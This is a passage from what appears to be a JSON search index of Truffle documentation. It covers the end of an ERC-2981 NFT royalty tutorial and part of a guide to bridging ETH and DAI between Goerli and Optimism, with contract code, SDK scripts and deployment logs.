= await royalPetsInstance . supportsInterface ( ERC2981InterfaceId ); assert . equal ( isERC721 , true , \"RoyalPets is not an ERC721\" ); assert . equal ( isER2981 , true , \"RoyalPets is not an ERC2981\" ); }); it ( \"should return the correct royalty info when specified and burned\" , async () => { const royalPetsInstance = await RoyalPets . deployed (); await royalPetsInstance . mintNFT ( accounts [ 0 ], \"fakeURI\" ); // Override royalty for this token to be 10% and paid to a different account await royalPetsInstance . mintNFTWithRoyalty ( accounts [ 0 ], \"fakeURI\" , accounts [ 1 ], 1000 ); const defaultRoyaltyInfo = await royalPetsInstance . royaltyInfo . call ( 1 , 1000 ); var tokenRoyaltyInfo = await royalPetsInstance . royaltyInfo . call ( 2 , 1000 ); const owner = await royalPetsInstance . owner . call (); assert . equal ( defaultRoyaltyInfo [ 0 ], owner , \"Default receiver is not the owner\" ); // Default royalty percentage taken should be 1%. assert . equal ( defaultRoyaltyInfo [ 1 ]. toNumber (), 10 , \"Royalty fee is not 10\" ); assert . equal ( tokenRoyaltyInfo [ 0 ], accounts [ 1 ], \"Royalty receiver is not a different account\" ); // Default royalty percentage taken should be 1%. assert . equal ( tokenRoyaltyInfo [ 1 ]. toNumber (), 100 , \"Royalty fee is not 100\" ); // Royalty info should be set back to default when NFT is burned await royalPetsInstance . burnNFT ( 2 ); tokenRoyaltyInfo = await royalPetsInstance . royaltyInfo . call ( 2 , 1000 ); assert . equal ( tokenRoyaltyInfo [ 0 ], owner , \"Royalty receiver has not been set back to default\" ); assert . equal ( tokenRoyaltyInfo [ 1 ]. toNumber (), 10 , \"Royalty has not been set back to default\" ); }); }); And, finally, just call truffle test ! Contract: RoyalPets \u2714 should support the ERC721 and ERC2198 standards ( 67ms ) \u2714 should return the correct royalty info when specified and burned ( 1077ms ) 2 passing ( 1s )", "title": "Test Your Smart Contract"}, {"location": "guides/nft-royalty/#mint-an-nft-and-view-it-in-your-mobile-wallet-or-opensea", "text": "If you want to mint an NFT for yourself and view it in your mobile MetaMask wallet, you'll need to deploy your contract to a public testnet or mainnet. To do so, you'll need to grab your Infura project API from your Infura project and your MetaMask wallet secret key. At the root of your folder, add a .env file, in which we'll put in that information. WARNING: DO NOT PUBLICIZE OR COMMIT THIS FILE. We recommend adding .env to a .gitignore file. MNEMONIC = \"YOUR SECRET KEY\" INFURA_API_KEY = \"YOUR INFURA_API_KEY\" Then, at the top of truffle-config.js , add this code to get retrieve that information: require ( 'dotenv' ). config (); const mnemonic = process . env [ \"MNEMONIC\" ]; const infuraApiKey = process . env [ \"INFURA_API_KEY\" ]; const HDWalletProvider = require ( '@truffle/hdwallet-provider' ); And finally, add the Goerli network to the networks list under module.exports : goerli : { provider : () => new HDWalletProvider ( mnemonic , `https://goerli.infura.io/v3/ ${ infuraApiKey } ` ), network_id : 5 , // Goerli's network id chain_id : 5 , // Goerli's chain id gas : 5500000 , // Gas limit used for deploys. confirmations : 2 , // # of confirmations to wait between deployments. (default: 0) timeoutBlocks : 200 , // # of blocks before a deployment times out (minimum/default: 50) skipDryRun : true // Skip dry run before migrations? (default: false for public nets) } Your final truffle-config.js should look something like this: require ( 'dotenv' ). config (); const mnemonic = process . env [ \"MNEMONIC\" ]; const infuraApiKey = process . env [ \"INFURA_API_KEY\" ]; const HDWalletProvider = require ( '@truffle/hdwallet-provider' ); module . exports = { networks : { development : { host : \"127.0.0.1\" , // Localhost (default: none) port : 7545 , // Standard Ethereum port (default: none) network_id : \"*\" , // Any network (default: none) }, goerli : { provider : () => new HDWalletProvider ( mnemonic , `https://goerli.infura.io/v3/ ${ infuraApiKey } ` ), network_id : 5 , // Goerli's network id chain_id : 5 , // Goerli's chain id gas : 5500000 , // Gas limit used for deploys. confirmations : 2 , // # of confirmations to wait between deployments. (default: 0) timeoutBlocks : 200 , // # of blocks before a deployment times out (minimum/default: 50) skipDryRun : true // Skip dry run before migrations? (default: false for public nets) } }, // Set default mocha options here, use special reporters, etc. mocha : { // timeout: 100000 }, // Configure your compilers compilers : { solc : { version : \"0.8.15\" , // Fetch exact version from solc-bin (default: truffle's version) } }, }; Then, we'll need to install the dev dependencies for dotenv and @truffle/hdwallet-provider . Lastly, run truffle migrate --network goerli to deploy! npm i --save-dev dotenv npm i --save-dev @truffle/hdwallet-provider truffle migrate --network goerli Then, to quickly interact with the goerli network, we can use truffle console --network goerli , and call the appropriate contract functions. We've already pinned some metadata to IPFS for you to use as your tokenURI: ipfs://bafybeiffapvkruv2vwtomswqzxiaxdgm2dflet2cxmh6t4ixrgaezumbw4 . It should look a bit like this: truffle migrate --network goerli truffle ( goerli ) > const contract = await RoyalPets.deployed () undefined truffle ( goerli ) > await contract.mintNFT ( \"YOUR ADDRESS\" , \"ipfs://bafybeiffapvkruv2vwtomswqzxiaxdgm2dflet2cxmh6t4ixrgaezumbw4\" ) If you want to populate your own metadata, there are a variety of ways to do so - with either Truffle or Infura. Check out the guides here: - truffle preserve - infura IPFS To view your NFT on your mobile wallet, open up MetaMask mobile, switch to the Goerli network, and open the NFTs tab! To view on OpenSea, you'll have to deploy to mainnet or Polygon. Otherwise, if you deploy your contract to rinkeby , you can view it on https://testnets.opensea.io/ . To be aware that rinkeby will be deprecated after the merge . If you don't want to monitor your transactions in an Infura project, you can also deploy via Truffle Dashboard , which allows you to deploy and sign transactions via MetaMask - thus never revealing your private key! To do so, simply run: truffle dashboard truffle migrate --network dashboard truffle console --network dashboard", "title": "Mint an NFT and View it in Your Mobile Wallet or OpenSea!"}, {"location": "guides/nft-royalty/#future-extensions", "text": "And there you have it! You've written an NFT smart contract that can be queried for royalty information. Look out for a more in-depth guide for uploading your metadata to IPFS! For a more a detailed walkthrough of the code, be sure to watch the livestream on YouTube . In future editions of Web3 Unleashed, expect to see how we can make our basic ERC-721s rentable by implementing ERC-4907 as well as creating a NFT rental marketplace that uses the various NFT standards that exist! Some additional extensions you might consider is overriding the way royaltyInfo is returned. Gemini has a cool blog detailing some such as decaying royalties, multisig royalties, and stepped royalties here . Let us know if you try any of them out! If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, start a discussion here . If you want to show off what you built or just hang with the Unleashed community in general, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Future Extensions"}, {"location": "guides/optimism-bridge-widget/", "text": "Web3 Unleashed: Optimistic rollups and bridging with Optimism \u00b6 Written by Emily Lin Last updated 11/03/2022 Overview \u00b6 In this episode of Web3 Unleashed, we're chatting with Annie Ke from Optimism about all things L2: optimistic roll-ups, bridging, and Optimism Bedrock! At the end, we'll build a bridge widget that leverages the scripts in the Truffle Optimism Bridge box , to embed bridging into your Optimism dapps! If you want a deeper dive into the bridge contract interfaces and an overview of L1s, L2s, and bridging, catch our presentation at Devcon! The completed code lives here . Bridging basics in the Optimism Bridge Box \u00b6 In this tutorial, we'll be creating an NFT Marketplace on Optimism and then adding Bridget, an Optimism bridge widget, that will bridge ETH using Optimism's bridge SDK. NOTE: To do the bridging for our widget, we will be interacting with the Optimism bridge contract that has already been deployed. Therefore, we will only be interacting with Ethereum Goerli and Optimism Goerli. If we wanted to run all of this locally, there are a lot of additional steps, such as deploying all the Optimism contracts to your local Ethereum and local Optimism and running a local sequencer. Set Up \u00b6 Install Truffle \u00b6 You'll need to install the latest version of Truffle Register for a MetaMask wallet \u00b6 To interact with your DApp in the browser, you'll need a MetaMask wallet. Sign up for an account here . Download VS Code \u00b6 Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, deploy, and debug your smart contracts, all without using the CLI! You can read more about it here . Create an Infura account and Infura project \u00b6 To connect your DApp to Ethereum Goerli and Optimism Goerli, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it optimism-marketplace , and select Web3 API from the dropdown. Get Ethereum Goerli Eth, Optimism Goerli Eth, and Goerli DAI \u00b6 In order to deploy your contracts and run our bridging scripts, you'll need some test Eth to cover your gas fees! There are multiple ways to get each one: Ethereum Goerli Eth: Paradigm has a great MultiFaucet that deposits funds across different networks. Optimism Goerli Eth: Optimism provides its own faucet for Optimism Goerli. Goerli DAI: Go to Uniswap , and connect your wallet to the Goerli test network. Then, exchange some of your Goerli ETH for Goerli DAI. Unbox the Optimism Bridge Box \u00b6 The Truffle Optimism Bridge Box contains contracts that interact with the Optimism bridge on L1 and L2, along with a set of migrations for deploying, calling functions, and passing messages and value between both layers. To set it up: truffle unbox optimism-bridge optimism-bridge cd optimism-bridge unbox will automatically run npm install for you. Bridge Box Contents \u00b6 There's a lot in this box! Let's go over some key differences between this box and a vanilla truffle init : package.json The box contains some special scripts to perform common functions. For example, migrate:ovm will migrate using truffle-confg.ovm.js without you having to type out --config truffle-config.ovm.js . contracts/ethereum and contracts/optimism The contracts folder is further divided into ethereum and optimism to differentiate between the two contracts. contracts/Greeter.sol We use the pre-deployed instance of this contract. It's the example contract from this Optimism tutorial for reference/learning. contracts/ethereum/GreeterL1.sol This contract will be deployed on Ethereum and controls a Greeter on Optimism. contracts/optimism/GreeterL2.sol This contract will be deployed on Optimism and controls a Greeter on Ethereum. truffle-config.js and truffle-config.ovm.js In order to specify which chain to deploy to, we introduce a second config - truffle-config.ovm.js - with its own build path, contract directory, and networks. By default, truffle migrate will use truffle-config.js . When we want to deploy our Optimism contracts, however, we can specify --config truffle-config.ovm.js so that we properly deploy the correct contracts to the relevant networks. migrations In this box, we have four different migrations files. 1_deploy_L1_contracts.js deploys the Ethereum contract GreeterL1.sol . 2_deploy_L2_contracts.js deploys the Optimism contract GreeterL2.sol . The remaining 2 migrations, 3_set_L2_greeting.js and 4_set_L1_greeting.js actually don't deploy contracts - they call contract functions to send messages across L1 and L2. Normally, 3_set_L2_greeting.js and 4_set_L1_greeting.js would just go in a separate Truffle script since it's just sending messages rather than deploying a contract. However, in this case, we wanted to illustrate how with Truffle, you can write ordered, incremental steps with migrations to end in a desired state. You can see how this is done in scripts/goerli_bridge_message.mjs . scripts/goerli_bridge_message.mjs npm run deploy runs this script - which is actually a series of truffle migrate calls. This automates the process of compiling contracts, running migrations, and sending messages across each side of the bridge. Note the --f 1 --to 1 , --f 2 --to 2 , --f 3 --to 3 , and --f 4 --to 4 flags. This is how we tell Truffle which migrations to run provided we prefix the migration script's name with the appropriate number. scripts/goerli_bridge_value.mjs This script automates the process of compiling contracts, running migrations, and sending messages across each side of the bridge. Let's dive into some of these files in depth. contracts/Greeter.sol \u00b6 There are two important functions to call out here: function setGreeting ( string memory _greeting ) public { greeting = _greeting ; emit SetGreeting ( msg . sender , tx . origin , getXorig ()); } setGreeting is the function we will be calling in the other contract. It doesn't do anything other than set a greeting message. // Get the cross domain origin, if any function getXorig () private view returns ( address ) { // Get the cross domain messenger's address each time. // This is less resource intensive than writing to storage. address cdmAddr = address ( 0 ); // Mainnet if ( block . chainid == 1 ) cdmAddr = 0x25ace71c97B33Cc4729CF772ae268934F7ab5fA1 ; // Kovan if ( block . chainid == 42 ) cdmAddr = 0x4361d0F75A0186C05f971c566dC6bEa5957483fD ; // Goerli if ( block . chainid == 5 ) cdmAddr = 0x5086d1eEF304eb5284A0f6720f79403b4e9bE294 ; // L2 (same address on every network) if ( block . chainid == 10 || block . chainid == 69 || block . chainid == 420 ) cdmAddr = 0x4200000000000000000000000000000000000007 ; // If this isn't a cross domain message if ( msg . sender != cdmAddr ) return address ( 0 ); // If it is a cross domain message, find out where it is from return ICrossDomainMessenger ( cdmAddr ). xDomainMessageSender (); } // getXorig() getXorig returns the address of the original contract calling the messenger. contracts/GreeterL1.sol \u00b6 This contract is deployed on Ethereum, but will be calling the setGreeting method from the pre-deployed Greeter contract on Optimism Goerli. address crossDomainMessengerAddr = 0x5086d1eEF304eb5284A0f6720f79403b4e9bE294 ; As you can see, this is the messenger contract address for the Goerli Chain Id 5 as specified in Greeter.sol . address greeterL2Addr = 0xC0836cCc8FBa87637e782Dde6e6572aD624fb984 ; This is the address of the pre-deployed Greeter contract on Optimism Goerli. function setGreeting ( string calldata _greeting ) public { bytes memory message ; message = abi . encodeWithSignature ( \"setGreeting(string)\" , _greeting ); ICrossDomainMessenger ( crossDomainMessengerAddr ). sendMessage ( greeterL2Addr , message , 1000000 // within the free gas limit amount ); } Finally, setGreeting does 2 things: - Sets message to be the encoded function signature and input - Calls the sendMessage method to call that function on the L2 contract contracts/GreeterL2.sol \u00b6 This contract does the same thing as GreeterL1.sol , except that it uses the messenger contract on Optimism ( 0x4200000000000000000000000000000000000007 ) and calls the function from Greeter contract on Ethereum. scripts/goerli_bridge_value.mjs \u00b6 This script demonstrates how to deposit/withdraw Ethereum and DAI using Optimism's SDK, which relies on Optimism's Standard Bridge. It's a big script, so we'll go over the most important parts. // Contract addresses for DAI tokens, taken // from https://static.optimism.io/optimism.tokenlist.json const daiAddrs = { l1Addr : \"0x11fE4B6AE13d2a6055C8D9cF65c55bac32B5d844\" , l2Addr : \"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1\" , }; // daiAddrs The standard bridge can only be used with tokens that have a properly configured ERC20 version on Optimism. In this case, we can find the tokens on this list . /** * getSigners() * Initializes ethers providers and returns wallets. */ const getSigners = async () => { const l1RpcProvider = new ethers . providers . JsonRpcProvider ( l1Url ); const l2RpcProvider = new ethers . providers . JsonRpcProvider ( l2Url ); const hdNode = ethers . utils . HDNode . fromMnemonic ( goerliMnemonic ); const privateKey = hdNode . derivePath ( ethers . utils . defaultPath ). privateKey ; const l1Wallet = new ethers . Wallet ( privateKey , l1RpcProvider ); const l2Wallet = new ethers . Wallet ( privateKey , l2RpcProvider ); return [ l1Wallet , l2Wallet ]; }; // getSigners /** * setup() * Initializes Optimism SDK's Cross Chain Messenger */ const setup = async () => { const [ l1Signer , l2Signer ] = await getSigners (); addr = l1Signer . address ; crossChainMessenger = new optimismSDK . CrossChainMessenger ({ l1ChainId : 5 , // Goerli value, 1 for mainnet l2ChainId : 420 , // Goerli value, 10 for mainnet l1SignerOrProvider : l1Signer , l2SignerOrProvider : l2Signer }) l1ERC20 = new ethers . Contract ( daiAddrs . l1Addr , erc20ABI , l1Signer ); l2ERC20 = new ethers . Contract ( daiAddrs . l2Addr , erc20ABI , l2Signer ); }; // setup These two methods are relatively straightforward. They are just setting up our wallets to sign our transactions. Notice in this case, we are specifying Goerli and Optimism Goerli, which have the chainIds 5 and 420, respectively. /** * reportBalances() * Logs ETH balances on L1 and L2. */ const reportBalances = async () => { const l1Balance = ( await crossChainMessenger . l1Signer . getBalance ()) . toString () . slice ( 0 , - 9 ); const l2Balance = ( await crossChainMessenger . l2Signer . getBalance ()) . toString () . slice ( 0 , - 9 ); console . log ( `On L1: ${ l1Balance } Gwei On L2: ${ l2Balance } Gwei` ); }; // reportBalances /** * reportERC20Balances() * Logs DAI balances on L1 and L2. */ const reportERC20Balances = async () => { const l1Balance = ( await l1ERC20 . balanceOf ( addr )). toString (). slice ( 0 , - 18 ); const l2Balance = ( await l2ERC20 . balanceOf ( addr )). toString (). slice ( 0 , - 18 ); console . log ( `DAI on L1: ${ l1Balance } DAI on L2: ${ l2Balance } ` ); }; // reportERC20Balances These are simply methods that will log how much DAI/ETH we have on each layer. They are used to give visibility into our assets while we are depositing/withdrawing tokens. /** * depositETH() * Bridges ETH from L1 to L2 and reports balances */ const depositETH = async () => { console . log ( \"Deposit ETH\" ); await reportBalances (); const start = new Date (); const response = await crossChainMessenger . depositETH ( gwei ); console . log ( `Transaction hash (on L1): ${ response . hash } ` ); await response . wait (); console . log ( \"Waiting for status to change to RELAYED\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . RELAYED ); await reportBalances (); console . log ( `depositETH took ${ ( new Date () - start ) / 1000 } seconds\\n\\n` ); }; // depositETH() In order to bridge Eth from L1 to L2, we call crossChainMessenger.depositETH , which takes gwei. To know that the bridging has completed, we need to wait for the RELAYED status. You can see the list of all possible statuses here . /** * depositERC20() * Bridges DAI from L1 to L2 and reports balances */ const depositERC20 = async () => { console . log ( \"Deposit ERC20\" ); await reportERC20Balances (); const start = new Date (); // Need the l2 address to know which bridge is responsible const allowanceResponse = await crossChainMessenger . approveERC20 ( daiAddrs . l1Addr , daiAddrs . l2Addr , dai ); await allowanceResponse . wait (); console . log ( `Allowance given by tx ${ allowanceResponse . hash } ` ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); const response = await crossChainMessenger . depositERC20 ( daiAddrs . l1Addr , daiAddrs . l2Addr , dai ); console . log ( `Deposit transaction hash (on L1): ${ response . hash } ` ); await response . wait (); console . log ( \"Waiting for status to change to RELAYED\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . RELAYED ); await reportERC20Balances (); console . log ( `depositERC20 took ${ ( new Date () - start ) / 1000 } seconds\\n\\n` ); }; // depositERC20() This method is relatively the same as depositETH . However, there is one important thing to call out. When we are bridging an ERC20 token, we MUST approve the Standard Token Bridge to use the amount of tokens that you want to deposit and the token contract addresses you care about or the deposit will fail. We do this in this part of the code: // Need the l2 address to know which bridge is responsible const allowanceResponse = await crossChainMessenger . approveERC20 ( daiAddrs . l1Addr , daiAddrs . l2Addr , dai ); /** * withdrawETH() * Bridges ETH from L2 to L1 and reports balances */ const withdrawETH = async () => { console . log ( \"Withdraw ETH\" ); const start = new Date (); await reportBalances (); const response = await crossChainMessenger . withdrawETH ( centieth ); console . log ( `Transaction hash (on L2): ${ response . hash } ` ); await response . wait (); console . log ( \"Waiting for status to change to IN_CHALLENGE_PERIOD\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . IN_CHALLENGE_PERIOD ); console . log ( \"In the challenge period, waiting for status READY_FOR_RELAY\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . READY_FOR_RELAY ); console . log ( \"Ready for relay, finalizing message now\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . finalizeMessage ( response ); console . log ( \"Waiting for status to change to RELAYED\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response , optimismSDK . MessageStatus . RELAYED ); await reportBalances (); console . log ( `withdrawETH took ${ ( new Date () - start ) / 1000 } seconds\\n\\n\\n` ); }; // withdrawETH() This method withdraws ETH from L2 to L1. Specifically, you'll notice now we check for two new states: IN_CHALLENGE_PERIOD and READY_FOR_RELAY . This is because when bridging from L2 to L1, there needs to be a time delay during which the transaction can be challenged (i.e., the challenge period). /** * withdrawERC20() * Bridges DAI from L2 to L1 and reports balances */ const withdrawERC20 = async () => { console . log ( \"Withdraw ERC20\" ); const start = new Date (); await reportERC20Balances (); const response = await crossChainMessenger . withdrawERC20 ( daiAddrs . l1Addr , daiAddrs . l2Addr , dai ); console . log ( `Transaction hash (on L2): ${ response . hash } ` ); await response . wait (); console . log ( \"Waiting for status to change to IN_CHALLENGE_PERIOD\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . IN_CHALLENGE_PERIOD ); console . log ( \"In the challenge period, waiting for status READY_FOR_RELAY\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . READY_FOR_RELAY ); console . log ( \"Ready for relay, finalizing message now\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . finalizeMessage ( response ); console . log ( \"Waiting for status to change to RELAYED\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response , optimismSDK . MessageStatus . RELAYED ); await reportERC20Balances (); console . log ( `withdrawERC20 took ${ ( new Date () - start ) / 1000 } seconds\\n\\n\\n` ); }; // withdrawERC20() This is just the ERC20 counterpart to the withdrawETH version. Now, let's actually run the scripts to see the output of Optimism bridging! Deploy the contracts and send messages \u00b6 In order to run our deployment script that also sends messages, we'll need to specify our mnemonics and Infura API key for the optimism-marketplace project we created earlier for the different networks we will be deploying to. Specify your GOERLI_MNEMONIC and INFURA_KEY in a .env file. After that's been specified, you should be able to run npm run deploy . You'll see that two contracts have been deployed and will be prompted to view the bridged on Etherscan. The result looks like this: Output $ truffle compile --config = truffle-config.ovm Compiling your contracts... =========================== > Compiling ./contracts/optimism/GreeterL2.sol > Compiling @eth-optimism/contracts/libraries/bridge/ICrossDomainMessenger.sol > Artifacts written to /Users/emilylin/dev/optimism-bridge-box/build/optimism-contracts > Compiled successfully using: - solc: 0 .8.4+commit.c7e474f2.Emscripten.clang $ truffle migrate --network = goerli --f 1 --to 1 --skip-dry-run Compiling your contracts... =========================== > Everything is up to date, there is nothing to compile. Starting migrations... ====================== > Network name: 'goerli' > Network id: 5 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_deploy_L1_contracts.js ======================== Deploying L1 Greeter \ud83d\udc4b Deploying 'GreeterL1' --------------------- > transaction hash: 0x0d60c97232474974d872fb99159772681351275a45fc33034818e4a069ba3944 - Blocks: 0 Seconds: 0 - Blocks: 1 Seconds: 4 - Blocks: 1 Seconds: 8 - Blocks: 1 Seconds: 12 - Blocks: 2 Seconds: 16 - Blocks: 2 Seconds: 20 - Blocks: 2 Seconds: 24 - Blocks: 2 Seconds: 28 - Blocks: 2 Seconds: 32 - Blocks: 2 Seconds: 36 > Blocks: 2 Seconds: 36 > contract address: 0x70B01484283d5495930125305ebbB62224EF9424 > block number: 7711471 > block timestamp: 1664905308 > account: 0xA31618621805C9215B5Ade58EB09dBA8f32Bbdb8 > balance: 0 .258526123140245736 > gas used: 326161 ( 0x4fa11 ) > gas price: 2 .50000001 gwei > value sent: 0 ETH > total cost: 0 .00081540250326161 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .00081540250326161 ETH Summary ======= > Total deployments: 1 > Final cost: 0 .00081540250326161 ETH $ truffle migrate --network = optimistic_goerli --config = truffle-config.ovm --f 2 --to 2 --skip-dry-run Compiling your contracts... =========================== > Everything is up to date, there is nothing to compile. Starting migrations... ====================== > Network name: 'optimistic_goerli' > Network id: 420 > Block gas limit: 15000000 ( 0xe4e1c0 ) 2_deploy_L2_contracts.js ======================== Deploying L2 Greeter \ud83d\udc4b\ud83d\udc4b Deploying 'GreeterL2' --------------------- > transaction hash: 0x019c43d23d1998655e0d3511372847d4c5390c6c2708be1fdea1edab5c5d240d - Blocks: 0 Seconds: 0 - Blocks: 3 Seconds: 4 > Blocks: 3 Seconds: 4 > contract address: 0xdB48896120B728a3a152a07cF40632820ADa7111 > block number: 1683657 > block timestamp: 1664905316 > account: 0xA31618621805C9215B5Ade58EB09dBA8f32Bbdb8 > balance: 0 .399999347575380974 > gas used: 232016 ( 0x38a50 ) > gas price: 0 .000000001 gwei > value sent: 0 ETH > total cost: 0 .000000000000232016 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .000000000000232016 ETH Summary ======= > Total deployments: 1 > Final cost: 0 .000000000000232016 ETH $ truffle migrate --network = goerli --f 3 --to 3 --skip-dry-run Compiling your contracts... =========================== > Everything is up to date, there is nothing to compile. Starting migrations... ====================== > Network name: 'goerli' > Network id: 5 > Block gas limit: 30000000 ( 0x1c9c380 ) 3_set_L2_greeting.js ==================== Updating the L2 Greetings contract from L1! \ud83d\udc4b\ud83d\udc4b \ud83d\ude4c Greeter txn confirmed on L1! 0xe392e0edb1dbc5db05546846eb0c098e20bfc1557265e8ee5c2ced3f8be76bc0 \ud83d\udee3\ufe0f Bridging message to L2 Greeter contract... \ud83d\udd50 In about 1 minute, check the Greeter contract \"read\" function : https://goerli-optimism.etherscan.io/address/0xC0836cCc8FBa87637e782Dde6e6572aD624fb984#readContract ------------------------------------- > Total cost: 0 ETH Summary ======= > Total deployments: 0 > Final cost: 0 ETH $ truffle migrate --network = optimistic_goerli --config = truffle-config.ovm --f 4 --to 4 --skip-dry-run Compiling your contracts... =========================== > Everything is up to date, there is nothing to compile. Starting migrations... ====================== > Network name: 'optimistic_goerli' > Network id: 420 > Block gas limit: 15000000 ( 0xe4e1c0 ) 4_set_L1_greeting.js ==================== Updating the L1 Greetings contract from L2! \ud83d\udc4b \ud83d\ude4c\ud83d\ude4c Greeter txn confirmed on L2! 0x4ed90d90a5b30770c69766b4bc017c78bc15322169baada2a95e1e01ca048eaa \ud83d\udee3\ufe0f Bridging message to L1 Greeter contract. \ud83d\udd50 This will take at least 1 -5 min... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... \ud83d\udcec Message received! Finalizing... \ud83c\udf89 Message finalized. Check the L1 Greeter contract \"read\" function : https://goerli.etherscan.io/address/0x7fA4D972bB15B71358da2D937E4A830A9084cf2e#readContract ------------------------------------- > Total cost: 0 ETH Summary ======= > Total deployments: 0 > Final cost: 0 ETH Send Eth and DAI across the bridge \u00b6 To send Eth and DAI across the bridge, simply run a truffle exec scripts/goerli_bridge_value.js . This result should look like this: Output Deposit ETH On L1:207145727 Gwei On L2:539999353 Gwei Transaction hash ( on L1 ) : 0x5af02f2c7b9350fa3762f37aedc9df6cbf826e82e00ad19ba4c11abfc46ec783 Waiting for status to change to RELAYED Time so far 22 .473 seconds On L1:206934536 Gwei On L2:539999355 Gwei depositETH took 220 .514 seconds Withdraw ETH On L1:206934536 Gwei On L2:539999355 Gwei Transaction hash ( on L2 ) : 0x7315691a120bd13954b2d3243e8fe47f68c14a920ecaf5b889a06a8af46b4f18 Waiting for status to change to IN_CHALLENGE_PERIOD Time so far 3 .284 seconds In the challenge period, waiting for status READY_FOR_RELAY Time so far 151 .495 seconds Ready for relay, finalizing message now Time so far 162 .431 seconds Waiting for status to change to RELAYED Time so far 166 .164 seconds On L1:215727635 Gwei On L2:529999355 Gwei withdrawETH took 188 .858 seconds Deposit ERC20 DAI on L1:43 DAI on L2: Allowance given by tx 0xf81b69b54597af3934daad2a0b0491fb19d161714f84b535b702137e08a7f2d3 Time so far 22 .799 seconds Deposit transaction hash ( on L1 ) : 0xe29e229f7afece8c09317db908ff3166c41f6858972e7ac44c3069fde458319b Waiting for status to change to RELAYED Time so far 34 .414 seconds DAI on L1:42 DAI on L2:1 depositERC20 took 261 .9 seconds Withdraw ERC20 DAI on L1:42 DAI on L2:1 Transaction hash ( on L2 ) : 0x569c638dfb4a034b6a267b024c415dbc5f26412fb6f2c7a56b531d332f209ae9 Waiting for status to change to IN_CHALLENGE_PERIOD Time so far 8 .008 seconds In the challenge period, waiting for status READY_FOR_RELAY Time so far 324 .519 seconds Ready for relay, finalizing message now Time so far 359 .411 seconds Waiting for status to change to RELAYED Time so far 363 .363 seconds DAI on L1:43 DAI on L2: withdrawERC20 took 372 .773 seconds Given everything works, we can essentially copy paste the relevant withdrawETH/depositETH functions in goerli_bridge_value.js into a frontend Bridge component. We'll be doing that when we create the NFT marketplace. Build a Marketplace DApp on Optimism \u00b6 Now that we've got the bridging basics down, let's use the NFT marketplace tutorial in this guide and add a new page specifically for users to bridge their ETH. We will be organizing the project folder structure into two parts: a truffle folder for all of your smart contract development needs, and a client folder to hold your code for the marketplace frontend. Move bridge contents into a truffle folder \u00b6 Now that we are adding a client component to our DApp, let's place all the relevant Truffle files in a separate folder for organization. Create a folder called truffle . Then, move the contracts , migrations , scripts , and node_modules folders into the truffle folder. Then, also move .env , package.json , package-lock.json , truffle-config.js , and truffle-config.ovm.js into the truffle folder . We don't need the .env.example anymore, so delete that too. Your top level directory folder structure should look like this: . \u251c\u2500\u2500 .gitignore \u251c\u2500\u2500 LICENSE \u251c\u2500\u2500 README.md \u251c\u2500\u2500 client \u2514\u2500\u2500 truffle Your truffle folder structure should look like this: truffle \u251c\u2500\u2500 .env \u251c\u2500\u2500 contracts \u251c\u2500\u2500 